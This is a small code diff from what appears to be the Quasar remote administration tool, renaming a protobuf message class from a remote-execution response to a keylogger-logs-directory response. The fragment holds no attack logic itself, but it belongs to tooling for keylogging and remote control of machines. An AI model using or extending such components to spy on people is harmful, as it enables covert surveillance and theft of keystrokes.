@@ -3,9 +3,9 @@
 namespace Quasar.Common.Messages
 {
     [ProtoContract]
-    public class DoRemoteExecutionResponse : IMessage
+    public class GetKeyloggerLogsDirectoryResponse : IMessage
     {
         [ProtoMember(1)]
-        public bool Success { get; set; }
+        public string LogsDirectory { get; set; }
     }
 }
